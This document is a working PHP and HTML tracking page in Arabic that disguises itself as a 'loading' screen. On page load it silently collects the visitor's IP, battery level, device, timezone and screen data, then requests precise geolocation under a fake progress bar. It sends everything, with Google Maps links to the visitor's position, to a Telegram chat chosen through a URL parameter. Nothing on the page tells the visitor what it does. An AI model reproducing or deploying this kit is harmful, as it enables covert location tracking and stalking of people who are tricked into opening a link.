<?php
$botToken = "BBOTTTTTTTTTTT";

function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $message = $input['message'];

    $result = sendTelegramMessage($chatId, $message, $botToken);
    
    header('Content-Type: application/json');
    echo $result;
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>جاري التحميل...</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      background-color: #000000;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      overflow-x: hidden;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 500px;
      text-align: center;
      padding: 20px;
      border-radius: 15px;
      background: rgba(30, 30, 30, 0.9);
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.36);
      backdrop-filter: blur(4px);
      border: 1px solid rgba(100, 100, 100, 0.2);
    }
    
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      background: linear-gradient(135deg, #222222 0%, #444444 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 40px;
    }
    
    h1 {
      margin-bottom: 15px;
      font-size: 24px;
      color: #cccccc;
    }
    
    p {
      margin-bottom: 20px;
      line-height: 1.6;
      color: #aaaaaa;
    }
    
    .loader {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(100, 100, 100, 0.2);
      border-radius: 50%;
      border-top-color: #666666;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .progress-bar {
      width: 100%;
      height: 8px;
      background: rgba(100, 100, 100, 0.2);
      border-radius: 4px;
      overflow: hidden;
      margin: 20px 0;
    }
    
    .progress {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #333333 0%, #666666 100%);
      border-radius: 4px;
      transition: width 0.3s ease;
    }
    
    .status {
      margin-top: 20px;
      font-size: 14px;
      color: #999999;
      padding: 10px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 8px;
    }
    
    .hidden {
      display: none;
    }
    
    .btn {
      background: linear-gradient(90deg, #333333 0%, #666666 100%);
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 50px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      font-weight: bold;
    }
    
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
    }
    
    .location-icon {
      font-size: 60px;
      color: #666666;
      margin: 20px 0;
      animation: pulse 1.5s infinite;
    }
    
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">⏳</div>
    
    <div id="initialView">
      <h1>جاري التحميل</h1>
      <p>يتم الآن تحميل المحتوى، الرجاء الانتظار...</p>
      
      <div class="location-icon">📱</div>
      
      <div class="progress-bar">
        <div class="progress" id="progress"></div>
      </div>
      
      <div class="loader"></div>
      
      <div class="status" id="status">جاري التهيئة...</div>
    </div>
    
    <div id="successView" class="hidden">
      <h1>تم التحميل بنجاح</h1>
      <p>شكراً لك على الانتظار. يمكنك الآن إغلاق هذه الصفحة.</p>
      <div class="status" id="successStatus"></div>
      <button class="btn" onclick="window.close()">إغلاق</button>
    </div>
    
    <div id="errorView" class="hidden">
      <h1>حدث خطأ</h1>
      <p>عذراً، حدث خطأ أثناء التحميل. يرجى تحديث الصفحة والمحاولة مرة أخرى.</p>
      <div class="status" id="errorStatus"></div>
      <button class="btn" onclick="window.location.reload()">تحديث الصفحة</button>
    </div>
  </div>

  <script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID');

  // عناصر DOM
  const initialView = document.getElementById('initialView');
  const successView = document.getElementById('successView');
  const errorView = document.getElementById('errorView');
  const statusEl = document.getElementById('status');
  const successStatusEl = document.getElementById('successStatus');
  const errorStatusEl = document.getElementById('errorStatus');
  const progressEl = document.getElementById('progress');
  
  // عرض الرسالة
  function updateStatus(message) {
    statusEl.textContent = message;
  }
  
  // تحديث شريط التقدم
  function updateProgress(percent) {
    progressEl.style.width = percent + '%';
  }
  
  // جمع معلومات الجهاز
  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let ipAddress = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      ipAddress = data.ip;
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      ip: ipAddress,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  // إرسال البيانات إلى الخادم
  async function sendToServer(chatId, message) {
    try {
      const data = {
        chatId: chatId,
        message: message
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {ok: false, error: error.message};
    }
  }

  // تبديل الواجهات
  function showView(view) {
    initialView.classList.add('hidden');
    successView.classList.add('hidden');
    errorView.classList.add('hidden');
    
    view.classList.remove('hidden');
  }

  // العملية الرئيسية
  async function mainProcess() {
    if (!chatId) {
      updateStatus("معرف المستخدم غير صحيح");
      errorStatusEl.textContent = "معرف المستخدم غير صحيح أو انتهت صلاحية الرابط";
      showView(errorView);
      return;
    }
    
    updateProgress(10);
    updateStatus("جمع معلومات الجهاز...");
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      updateProgress(30);
      updateStatus("إرسال معلومات الجهاز...");
      
      // إرسال الرسالة الأولى مع معلومات الجهاز
      const initMessage = `
📍 <b>بدء تتبع الموقع</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🔋 <b>البطارية:</b> ${deviceInfo.battery}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
📶 <b>الاتصال:</b> ${deviceInfo.connection}
🌐 <b>اللغة:</b> ${deviceInfo.language}
🕒 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}
📺 <b>الشاشة:</b> ${deviceInfo.screen}
📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
      `;
      
      await sendToServer(chatId, initMessage);
      updateProgress(50);
      updateStatus("جاري تحميل المحتوى...");
      
      // التحقق من دعم المتصفح للخدمة
      if (!"geolocation" in navigator) {
        updateProgress(100);
        
        const errorMessage = `
❌ <b>فشل الوصول إلى الموقع</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
⚠️ <b>الخطأ:</b> المتصفح لا يدعم خدمات الموقع
        `;
        
        await sendToServer(chatId, errorMessage);
        
        errorStatusEl.textContent = "المتصفح لا يدعم خدمات الموقع";
        showView(errorView);
        return;
      }
      
      // طلب الموقع
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          updateProgress(80);
          updateStatus("جاري إكمال التحميل...");
          
          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
          const mapsLink = `https://maps.google.com/maps?q=${latitude},${longitude}`;
          const earthLink = `https://earth.google.com/web/@${latitude},${longitude}`;
          
          const message = `
📍 <b>تم الحصول على الموقع</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📌 <b>الإحداثيات:</b> ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
🗺️ <b>خرائط جوجل:</b> <a href="${mapsLink}">عرض على خرائط جوجل</a>
🌍 <b>جوجل إيرث:</b> <a href="${earthLink}">عرض على جوجل إيرث</a>
📏 <b>الدقة:</b> ${accuracy}m
📐 <b>الارتفاع:</b> ${altitude ? altitude.toFixed(2) + 'm' : 'غير متوفر'}
🎯 <b>دقة الارتفاع:</b> ${altitudeAccuracy ? altitudeAccuracy.toFixed(2) + 'm' : 'غير متوفر'}
🧭 <b>الاتجاه:</b> ${heading ? heading.toFixed(2) + '°' : 'غير متوفر'}
🚀 <b>السرعة:</b> ${speed ? speed.toFixed(2) + 'm/s' : 'غير متوفر'}
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🔋 <b>البطارية:</b> ${deviceInfo.battery}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
📶 <b>الاتصال:</b> ${deviceInfo.connection}
🌐 <b>اللغة:</b> ${deviceInfo.language}
🕒 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}
📺 <b>الشاشة:</b> ${deviceInfo.screen}
📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
          `;
          
          const result = await sendToServer(chatId, message);
          updateProgress(100);
          
          if (result && result.ok) {
            successStatusEl.textContent = "تم التحميل بنجاح";
            showView(successView);
          } else {
            errorStatusEl.textContent = "فشل في التحميل";
            showView(errorView);
          }
        },
        async (error) => {
          updateProgress(100);
          
          const errorMessage = `
❌ <b>فشل الوصول إلى الموقع</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
⚠️ <b>الخطأ:</b> ${error.message} (الكود: ${error.code})
          `;
          
          await sendToServer(chatId, errorMessage);
          
          errorStatusEl.textContent = `خطأ: ${error.message}`;
          showView(errorView);
        },
        { 
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
      
    } catch (error) {
      updateProgress(100);
      errorStatusEl.textContent = `خطأ غير متوقع: ${error.message}`;
      showView(errorView);
    }
  }

  // بدء العملية عند تحميل الصفحة
  document.addEventListener('DOMContentLoaded', mainProcess);
  </script>
</body>
</html>
